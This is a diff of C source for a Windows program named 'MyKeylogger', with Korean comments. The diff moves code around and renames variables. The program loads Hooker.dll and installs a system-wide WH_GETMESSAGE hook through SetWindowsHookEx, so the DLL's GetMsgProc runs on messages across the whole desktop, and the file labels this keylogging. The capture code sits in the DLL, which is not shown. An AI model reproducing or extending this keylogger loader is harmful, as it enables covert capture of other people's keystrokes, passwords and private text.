@@ -6,85 +6,79 @@
 
 #include <windows.h>
 
-LRESULT CALLBACK WndProc( HWND hWnd, UINT iMessage, 
-						 WPARAM wParam, LPARAM lParam ) 
-{   
-	static HINSTANCE hinstDll; // LoadLibrary() 리턴값 저장
-	HOOKPROC hGetMsgProc; // GetProcAddress(,) 리턴값 저장
-	static HHOOK hKeyHook; // SetWindowsHookEx(,,,) 리턴값 저장
-
-    switch( iMessage ) 
-    { 
-		case WM_CREATE: // 윈도우 생성시 후킹 설정: 실제 후킹은 연결된 dll에서 수행
-			// 1. dll loaging
-			hinstDll = LoadLibrary("Hooker.dll"); // DLL을 로드한다.
-            if(!hinstDll){
-				MessageBox(hWnd, "Hooker.dll을 로드할 수 없습니다.", "오류", MB_OK);
-				ExitProcess(1);
-            }
-
-			// 2. get point of function
-            hGetMsgProc = (HOOKPROC)GetProcAddress(hinstDll, "GetMsgProc");          
-            if(!hGetMsgProc){
-                MessageBox(hWnd, "hGetMsgProc 함수를 로드할 수 없습니다.", "오류", MB_OK);
-                FreeLibrary(hinstDll);
-                ExitProcess(1);
-            }
-
-			// 3. set hooking
-			hKeyHook = SetWindowsHookEx(WH_GETMESSAGE, hGetMsgProc, hinstDll, 0);
-			// 모든 메세지에 대해 hinstDll의 hGetMsgProc실행
-			if(!hKeyHook){
-                MessageBox(hWnd, "Hooking을 성공하지 못했습니다.", "오류", MB_OK);
-                FreeLibrary(hinstDll);
-                ExitProcess(1);
-            }
-            break;
-		case WM_DESTROY: 
-			PostQuitMessage( 0 );             
-    } 
-
-    return DefWindowProc( hWnd, iMessage, wParam, lParam ); 
-    // 위에서 정의되지 않은 메시지는 기본으로 처리.
-} 
+LRESULT CALLBACK WndProc( HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam); 
+HINSTANCE g_hInst;
+LPSTR lpszClass="MyKeylogger";
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
 				   LPSTR lpCmdLine, int nShowCmd) 
 {
-	HWND hWnd; // 메모리에 윈도우 창 생성후, 그 위치를 저장할 변수
-	MSG message; // 메세지 변수
-	WNDCLASS wndclass; // 윈도우
+	HWND hWnd;
+	MSG Message;
+	WNDCLASS WndClass;
+	g_hInst=hInstance;
 
-	wndclass.cbClsExtra = 0;
-	wndclass.cbWndExtra = 0; 
-	// 이 두개는 추가 메모리를 사용하고자 할때 사용하는 것으로
-	// 거의 사용하지 않는다.
+	WndClass.cbClsExtra=0;
+	WndClass.cbWndExtra=0;
+	WndClass.hbrBackground=(HBRUSH)GetStockObject(WHITE_BRUSH);
+	WndClass.hCursor=LoadCursor(NULL,IDC_ARROW);
+	WndClass.hIcon=LoadIcon(NULL,IDI_APPLICATION);
+	WndClass.hInstance=hInstance;
+	WndClass.lpfnWndProc=(WNDPROC)WndProc;
+	WndClass.lpszClassName=lpszClass;
+	WndClass.lpszMenuName=NULL;
+	WndClass.style=CS_HREDRAW | CS_VREDRAW;
+	RegisterClass( &WndClass ); 
 
-	wndclass.hbrBackground = (HBRUSH)GetStockObject(GRAY_BRUSH);
-	// 메인 윈도의 배경색 지정: 회색
+	hWnd=CreateWindow(lpszClass,lpszClass,WS_OVERLAPPEDWINDOW,
+		  CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,
+		  NULL,(HMENU)NULL,hInstance,NULL);     
+	ShowWindow(hWnd, nShowCmd); 
 
-    wndclass.hCursor = LoadCursor( NULL, IDC_ARROW );        
-    wndclass.hIcon =  LoadIcon( NULL, IDI_APPLICATION );
-    wndclass.hInstance =  hInstance; 
-    wndclass.lpfnWndProc = (WNDPROC)WndProc; // 콜백함수 등록
-    wndclass.lpszClassName =  "WG WINDOW";        
-    wndclass.lpszMenuName = NULL;
-    wndclass.style = NULL;
-
-	RegisterClass( &wndclass ); // 윈도우를 등록
-
-	hWnd = CreateWindow("WG WINDOW", "MyKeylogger 0.1", WS_OVERLAPPEDWINDOW, 
-		200, 200, 500, 300, NULL, (HMENU)NULL, hInstance, NULL );        
-
-	ShowWindow(hWnd, nShowCmd); // 윈도우를 화면에 출력
-
-	while( GetMessage( &message, NULL, 0, 0 ) ) {
-		TranslateMessage( &message ); // 메시지 번역
-		DispatchMessage( &message ); // 메시지 처리
+	while( GetMessage( &Message, NULL, 0, 0 ) ) {
+		TranslateMessage( &Message ); 
+		DispatchMessage( &Message ); 
 	}
 
-	return message.wParam;
+	return Message.wParam;
 }
 
+LRESULT CALLBACK WndProc( HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam) 
+{   
+	static HINSTANCE hinstDll;	// LoadLibrary() 리턴값 저장
+	HOOKPROC hGetMsgProc;		// GetProcAddress(,) 리턴값 저장
+	static HHOOK hKeyHook;		// SetWindowsHookEx(,,,) 리턴값 저장
 
+    switch( iMessage ) 
+    { 
+	case WM_CREATE:		// 윈도우 생성시 후킹 설정: 실제 후킹은 연결된 dll에서 수행
+		// 1. dll loaging
+		hinstDll = LoadLibrary("Hooker.dll"); // DLL을 로드한다.
+        if(!hinstDll){
+			MessageBox(hWnd, "Hooker.dll을 로드할 수 없습니다.", "오류", MB_OK);
+			ExitProcess(1);
+        }
 
+		// 2. get pointer of function
+        hGetMsgProc = (HOOKPROC)GetProcAddress(hinstDll, "GetMsgProc");          
+        if(!hGetMsgProc){
+            MessageBox(hWnd, "hGetMsgProc 함수를 로드할 수 없습니다.", "오류", MB_OK);
+            FreeLibrary(hinstDll);
+            ExitProcess(1);
+        }
+
+		// 3. set hooking
+		hKeyHook = SetWindowsHookEx(WH_GETMESSAGE, hGetMsgProc, hinstDll, 0);
+		// 모든 메세지에 대해 hinstDll의 hGetMsgProc실행
+		if(!hKeyHook){
+            MessageBox(hWnd, "Hooking을 성공하지 못했습니다.", "오류", MB_OK);
+            FreeLibrary(hinstDll);
+            ExitProcess(1);
+        }
+        break;
+	case WM_DESTROY: 
+		PostQuitMessage( 0 );             
+    } 
+
+    return DefWindowProc( hWnd, iMessage, wParam, lParam ); 
+} 
